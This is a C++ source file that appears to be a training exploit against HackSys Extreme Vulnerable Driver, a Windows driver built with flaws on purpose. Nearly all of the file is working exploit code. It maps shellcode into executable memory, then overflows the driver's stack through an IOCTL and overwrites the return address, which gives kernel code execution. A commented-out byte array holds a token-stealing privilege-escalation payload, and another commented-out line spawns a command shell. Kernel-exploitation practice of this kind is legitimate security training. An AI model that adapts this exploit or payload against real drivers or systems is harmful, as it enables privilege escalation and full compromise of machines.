#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

#define DEVICE_USERMODE_SYMBOLIC_LINK L"\\\\.\\HackSysExtremeVulnerableDriver"

#define IOCTL_STACK_BUFFER_OVERFLOW 0x222003

#define RET_OVERWRITE_OFFSET 0x818

extern "C" int __cdecl main(int argc, char const* argv[]) {
	printf("[*] %s Built %s %s\n", argv[0], __DATE__, __TIME__);

	// Init local variables
	HANDLE hDevice = NULL;
	BYTE byarrKernelShellcode[] = {
		0xCC,                   // int3
		0x90,                   // nop
		0x31, 0xC0,             // xor eax, eax
		0x48, 0x83, 0xC4, 0x28, // add rsp, 0x28
		0xC3                    // ret
	};
	// Modified PiPa EoP x64 payload to handle kernel recovery, DO NOT USE!
	//BYTE byarrKernelShellcode[] = { 0x33, 0xc0, 0x49, 0xc7, 0xc3, 0x20, 0x02, 0x00, 0x00, 0x48, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x80, 0xf7, 0xff, 0xff, 0x03, 0x81, 0x6c, 0x02, 0x00, 0x00, 0x03, 0x81, 0x70, 0x02, 0x00, 0x00, 0x83, 0xf8, 0x07, 0x74, 0x19, 0x83, 0xf8, 0x08, 0x74, 0x2e, 0x83, 0xf8, 0x09, 0x74, 0x29, 0x83, 0xf8, 0x0a, 0x74, 0x37, 0xb8, 0x01, 0x00, 0x00, 0xc0, 0xe9, 0x0a, 0x01, 0x00, 0x00, 0x49, 0xc7, 0xc1, 0x88, 0x01, 0x00, 0x00, 0x49, 0xc7, 0xc2, 0x08, 0x02, 0x00, 0x00, 0x49, 0xc7, 0xc3, 0x10, 0x02, 0x00, 0x00, 0xe9, 0xb9, 0x00, 0x00, 0x00, 0x49, 0xc7, 0xc1, 0xe8, 0x02, 0x00, 0x00, 0x49, 0xc7, 0xc2, 0x48, 0x03, 0x00, 0x00, 0xe9, 0xa6, 0x00, 0x00, 0x00, 0x8b, 0x81, 0x60, 0x02, 0x00, 0x00, 0x3d, 0x00, 0x28, 0x00, 0x00, 0x74, 0x5b, 0x3d, 0x5a, 0x29, 0x00, 0x00, 0x74, 0x54, 0x3d, 0x39, 0x38, 0x00, 0x00, 0x74, 0x4d, 0x3d, 0xd7, 0x3a, 0x00, 0x00, 0x74, 0x56, 0x3d, 0xab, 0x3f, 0x00, 0x00, 0x74, 0x4f, 0x3d, 0xee, 0x42, 0x00, 0x00, 0x74, 0x48, 0x3d, 0x63, 0x45, 0x00, 0x00, 0x74, 0x41, 0x3d, 0xba, 0x47, 0x00, 0x00, 0x74, 0x4a, 0x3d, 0xbb, 0x47, 0x00, 0x00, 0x74, 0x43, 0x3d, 0x61, 0x4a, 0x00, 0x00, 0x74, 0x4c, 0x3d, 0x62, 0x4a, 0x00, 0x00, 0x74, 0x45, 0x3d, 0x63, 0x4a, 0x00, 0x00, 0x74, 0x3e, 0x3d, 0x64, 0x4a, 0x00, 0x00, 0x74, 0x37, 0xb8, 0x01, 0x00, 0x00, 0xc0, 0xeb, 0x75, 0x49, 0xc7, 0xc1, 0xf0, 0x02, 0x00, 0x00, 0x49, 0xc7, 0xc2, 0x58, 0x03, 0x00, 0x00, 0xeb, 0x2e, 0x49, 0xc7, 0xc1, 0xe8, 0x02, 0x00, 0x00, 0x49, 0xc7, 0xc2, 0x58, 0x03, 0x00, 0x00, 0xeb, 0x1e, 0x49, 0xc7, 0xc1, 0xf0, 0x02, 0x00, 0x00, 0x49, 0xc7, 0xc2, 0x60, 0x03, 0x00, 0x00, 0xeb, 0x0e, 0x49, 0xc7, 0xc1, 0x48, 0x04, 0x00, 0x00, 0x49, 0xc7, 0xc2, 0xb8, 0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x4a, 0x8b, 0x04, 0x18, 0x48, 0x8b, 0xc8, 0x49, 0x03, 0xc1, 0x48, 0x8b, 0x00, 0x48, 0x83, 0x78, 0xf8, 0x04, 0x75, 0xf6, 0x49, 0x2b, 0xc1, 0x4a, 0x8b, 0x04, 0x10, 0x24, 0xf0, 0x4a, 0x8b, 0x14, 0x11, 0x48, 0x83, 0xe2, 0x0f, 0x48, 0x03, 0xc2, 0x4a, 0x89, 0x04, 0x11, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3 }; // [DBG]
	DWORD dwKernelShellcodeSize = sizeof(byarrKernelShellcode);
	PVOID pPayloadBuffer = NULL;
	BOOL bRet = FALSE;
	BOOLEAN bLocked = FALSE;
	BYTE byarrInputBuffer[0x820]; RtlZeroMemory(byarrInputBuffer, sizeof(byarrInputBuffer));
	DWORD dwBytesTransferred = 0;

	// Get handle to device object
	hDevice = CreateFileW(DEVICE_USERMODE_SYMBOLIC_LINK, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("[-] CreateFileW error: %d\n", GetLastError());
		goto cleanup;
	}
	printf("[+] Got handle to HEVD device object: 0x%X\n", HandleToULong(hDevice));

	// Allocate +RWX memory for kernel mode shellcode in local process UVAS
	pPayloadBuffer = VirtualAlloc(NULL, dwKernelShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pPayloadBuffer) {
		printf("[-] VirtualAlloc error: %d\n", GetLastError());
		goto cleanup;
	}
	printf("[+] Allocated +RWX memory for kernel mode shellcode in local process UVAS: 0x%p\n", pPayloadBuffer);

	// Lock the allocated user buffer into physical memory to ensure that it is not paged out before the payload is done executing
	bRet = VirtualLock(pPayloadBuffer, dwKernelShellcodeSize);
	if (bRet == 0) {
		printf("[-] VirtualLock error: %d\n", GetLastError());
		goto cleanup;
	}
	bLocked = TRUE;
	printf("[+] Locked allocated user buffer into physical memory to prevent it from paging out before the payload has finished execution.\n");

	// Copy kernel mode shellcode to allocated user buffer
	RtlMoveMemory(pPayloadBuffer, byarrKernelShellcode, dwKernelShellcodeSize);
	printf("[+] Copied kernel mode shellcode to allocated user buffer.\n");

	// Prepare input buffer to overwrite retaddr with address of payload buffer to achieve arbitrary kernel code execution
	RtlFillMemory(byarrInputBuffer, RET_OVERWRITE_OFFSET, 0x00);
	*((PDWORD_PTR)(byarrInputBuffer + RET_OVERWRITE_OFFSET)) = (DWORD_PTR)pPayloadBuffer;

	// Send IOCTL to trigger stack buffer overflow in HEVD driver
	bRet = DeviceIoControl(hDevice, IOCTL_STACK_BUFFER_OVERFLOW, byarrInputBuffer, sizeof(byarrInputBuffer), NULL, 0, &dwBytesTransferred, NULL);
	if (bRet == 0) {
		printf("[-] DeviceIoControl error: %d\n", GetLastError());
		goto cleanup;
	}
	printf("[+] Sent IOCTL to trigger stack buffer overflow.\n");

	// Wait for user to resume execution
	system("PAUSE");

	// Spawn a new cmd.exe session
	//system("cmd.exe"); // [DBG]

	// Cleanup
cleanup:
	if (bLocked)
		VirtualUnlock(pPayloadBuffer, dwKernelShellcodeSize);

	if (pPayloadBuffer)
		VirtualFree(pPayloadBuffer, 0, MEM_RELEASE);

	if (hDevice)
		CloseHandle(hDevice);

	return 0;
}